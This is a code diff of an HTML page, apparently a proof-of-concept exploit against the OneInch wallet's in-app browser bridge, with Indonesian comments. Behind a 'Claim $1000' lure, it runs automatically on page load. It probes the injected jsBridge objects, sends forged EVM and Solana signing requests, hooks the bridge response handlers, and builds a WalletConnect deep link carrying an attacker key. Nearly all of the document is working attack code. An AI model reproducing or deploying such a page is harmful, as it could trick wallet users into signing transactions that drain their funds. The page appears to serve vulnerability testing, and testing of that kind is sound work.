@@ -1,44 +1,220 @@
-<!-- evil.html di-host di domain penyerang -->
 <!DOCTYPE html>
 <html>
-<head><title>DeFi Yield Farm</title></head>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DeFi Yield Farm</title>
+<style>
+  body { font-family: monospace; background: #0d1117; color: #c9d1d9; padding: 12px; }
+  h1 { color: #58a6ff; font-size: 18px; }
+  #log {
+    background: #161b22; border: 1px solid #30363d; border-radius: 6px;
+    padding: 10px; height: 60vh; overflow-y: auto; white-space: pre-wrap;
+    font-size: 12px; line-height: 1.4;
+  }
+  .info  { color: #58a6ff; }
+  .ok    { color: #3fb950; }
+  .warn  { color: #d29922; }
+  .err   { color: #f85149; }
+  button {
+    background: #238636; color: white; border: none; padding: 10px 16px;
+    border-radius: 6px; font-size: 14px; margin: 8px 4px 8px 0; cursor: pointer;
+  }
+  button:active { background: #2ea043; }
+</style>
+</head>
 <body>
-<h1>Loading wallet...</h1>
-<script>
-// 1. Enumerasi bridge yang tersedia
-const bridges = ['jsBridge', 'proxyJsBridgeEvm', 'proxyJsBridgeSol'];
-bridges.forEach(b => console.log(b, window[b]));
+<h1>🦄 DeFi Yield Farm — Claim $1000</h1>
+<button onclick="runPOC()">Connect Wallet</button>
+<button onclick="clearLog()">Clear</button>
+<div id="log"></div>
 
-// 2. Kirim JSON-RPC palsu untuk minta signature
-const fakeRequest = {
+<script>
+const logEl = document.getElementById('log');
+
+function log(msg, cls = 'info') {
+  const line = document.createElement('div');
+  line.className = cls;
+  line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+  logEl.appendChild(line);
+  logEl.scrollTop = logEl.scrollHeight;
+  // Juga tampilkan alert untuk kejadian penting
+  console.log(msg);
+}
+
+function clearLog() { logEl.innerHTML = ''; }
+
+// ============================================================
+// STEP 0 — Deteksi bridge yang tersedia
+// ============================================================
+function detectBridges() {
+  log('=== STEP 0: Deteksi Bridge ===', 'info');
+  const bridges = ['jsBridge', 'proxyJsBridgeEvm', 'proxyJsBridgeSol'];
+  const found = [];
+
+  bridges.forEach(name => {
+    const exists = typeof window[name] !== 'undefined';
+    log(`  window.${name}: ${exists ? 'ADA ✅' : 'tidak ada ❌'}`,
+        exists ? 'ok' : 'warn');
+    if (exists) found.push(name);
+  });
+
+  // Cek method spesifik
+  if (window.jsBridge) {
+    ['postEvmMessage', 'postSolMessage'].forEach(m => {
+      const ok = typeof window.jsBridge[m] === 'function';
+      log(`  jsBridge.${m}(): ${ok ? 'ADA ✅' : 'tidak ada ❌'}`,
+          ok ? 'ok' : 'err');
+    });
+  }
+
+  // Cek interface yang di-inject oleh onPageStarted
+  ['OneInchIOSWallet', 'OneInchSolanaWallet'].forEach(n => {
+    const ok = typeof window[n] !== 'undefined';
+    log(`  window.${n}: ${ok ? 'ADA ✅' : 'tidak ada ❌'}`,
+        ok ? 'ok' : 'warn');
+  });
+
+  return found;
+}
+
+// ============================================================
+// STEP 1 — Kirim JSON-RPC palsu (EVM)
+// ============================================================
+function sendFakeEvmRequest() {
+  log('=== STEP 1: Kirim eth_signTransaction palsu ===', 'info');
+
+  if (!window.jsBridge || typeof window.jsBridge.postEvmMessage !== 'function') {
+    log('  ❌ jsBridge.postEvmMessage tidak tersedia — batalkan.', 'err');
+    alert('❌ Bridge EVM tidak ditemukan!\n\nHalaman ini mungkin tidak di-load di WebView OneInch, atau bridge tidak di-inject.');
+    return;
+  }
+
+  const fakeRequest = {
     jsonrpc: "2.0",
     id: 1,
     method: "eth_signTransaction",
     params: [{
-        from: "0xVictimAddress",
-        to: "0xAttackerAddress",
-        value: "0xde0b6b3a7640000", // 1 ETH
-        gas: "0x5208",
-        gasPrice: "0x3b9aca00",
-        nonce: "0x0",
-        data: "0x"
+      from: "0x0000000000000000000000000000000000000000",
+      to:   "0x1111111111111111111111111111111111111111",
+      value: "0xde0b6b3a7640000",   // 1 ETH
+      gas:   "0x5208",
+      gasPrice: "0x3b9aca00",
+      nonce: "0x0",
+      data:  "0x"
     }]
-};
+  };
 
-// 3. Kirim ke native — akan diproses sebagai request sah
-window.jsBridge.postEvmMessage(JSON.stringify(fakeRequest));
+  const jsonStr = JSON.stringify(fakeRequest);
+  log('  Payload: ' + jsonStr, 'warn');
 
-// 4. Untuk Solana
-const solRequest = {
+  try {
+    window.jsBridge.postEvmMessage(jsonStr);
+    log('  ✅ postEvmMessage() terpanggil — request diteruskan ke native.', 'ok');
+    alert('✅ Request EVM terkirim!\n\nJika wallet rentan, dialog signing akan muncul.\nJika tidak, berarti ada validasi origin.');
+  } catch (e) {
+    log('  ❌ Error: ' + e.message, 'err');
+    alert('❌ Gagal memanggil postEvmMessage:\n' + e.message);
+  }
+}
+
+// ============================================================
+// STEP 2 — Kirim JSON-RPC palsu (Solana)
+// ============================================================
+function sendFakeSolRequest() {
+  log('=== STEP 2: Kirim signAndSendTransaction palsu (Solana) ===', 'info');
+
+  if (!window.jsBridge || typeof window.jsBridge.postSolMessage !== 'function') {
+    log('  ❌ jsBridge.postSolMessage tidak tersedia.', 'err');
+    return;
+  }
+
+  const solRequest = {
     jsonrpc: "2.0",
     id: 2,
     method: "signAndSendTransaction",
     params: {
-        message: "BASE64_ENCODED_MALICIOUS_TX",
-        recentBlockhash: "..."
+      message: "AQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAED...",
+      recentBlockhash: "11111111111111111111111111111111"
     }
-};
-window.jsBridge.postSolMessage(JSON.stringify(solRequest));
+  };
+
+  const jsonStr = JSON.stringify(solRequest);
+  log('  Payload: ' + jsonStr.substring(0, 120) + '...', 'warn');
+
+  try {
+    window.jsBridge.postSolMessage(jsonStr);
+    log('  ✅ postSolMessage() terpanggil.', 'ok');
+  } catch (e) {
+    log('  ❌ Error: ' + e.message, 'err');
+  }
+}
+
+// ============================================================
+// STEP 3 — Test hook response (jika ada callback)
+// ============================================================
+function hookResponses() {
+  log('=== STEP 3: Hook response handler ===', 'info');
+
+  ['proxyJsBridgeEvm', 'proxyJsBridgeSol'].forEach(name => {
+    const proxy = window[name];
+    if (proxy && typeof proxy.postMessage === 'function') {
+      const orig = proxy.postMessage.bind(proxy);
+      proxy.postMessage = function(obj) {
+        log(`  ← Response dari ${name}: ${JSON.stringify(obj).substring(0,200)}`, 'ok');
+        alert(`📩 Response dari ${name}:\n\n${JSON.stringify(obj, null, 2).substring(0, 500)}`);
+        return orig(obj);
+      };
+      log(`  ✅ Hook terpasang di ${name}.postMessage`, 'ok');
+    } else {
+      log(`  ⚠️ ${name} tidak ada / bukan proxy.`, 'warn');
+    }
+  });
+}
+
+// ============================================================
+// STEP 4 — Test deep link WalletConnect
+// ============================================================
+function testWalletConnectDeeplink() {
+  log('=== STEP 4: Test deep link wc: ===', 'info');
+  const uri = 'wc:attacker-pubkey-here@2?bridge=https%3A%2F%2Fbridge.walletconnect.org&key=deadbeef';
+  const testUrl = 'https://example.com/wc?uri=' + encodeURIComponent(uri);
+  log('  URL uji: ' + testUrl, 'warn');
+  alert('Menguji deep link:\n' + testUrl + '\n\nJika dialog WalletConnect muncul → rentan.');
+  // window.location.href = testUrl; // Uncomment untuk test
+}
+
+// ============================================================
+// RUNNER
+// ============================================================
+function runPOC() {
+  clearLog();
+  log('🚀 Memulai POC Web3BroClient...', 'ok');
+  log('URL: ' + location.href, 'info');
+  log('UA: ' + navigator.userAgent, 'info');
+
+  const found = detectBridges();
+
+  if (found.length === 0) {
+    log('❌ TIDAK ADA BRIDGE DITEMUKAN', 'err');
+    alert(
+      '❌ Tidak ada bridge yang terdeteksi.\n\n' +
+      'Kemungkinan penyebab:\n' +
+      '1. Halaman ini TIDAK di-load di dalam WebView OneInch Wallet.\n' +
+      '2. Kamu membukanya di Chrome/Firefox biasa (bukan in-app browser).\n' +
+      '3. Aplikasi sudah dipatch / ada origin validation.\n\n' +
+      'Solusi: Buka link ini di dalam in-app browser OneInch Wallet.'
+    );
+    return;
+  }
+
+  hookResponses();
+  sendFakeEvmRequest();
+  setTimeout(sendFakeSolRequest, 1000);
+}
+
+// Auto-run setelah 500ms
+window.addEventListener('load', () => setTimeout(runPOC, 500));
 </script>
 </body>
 </html>
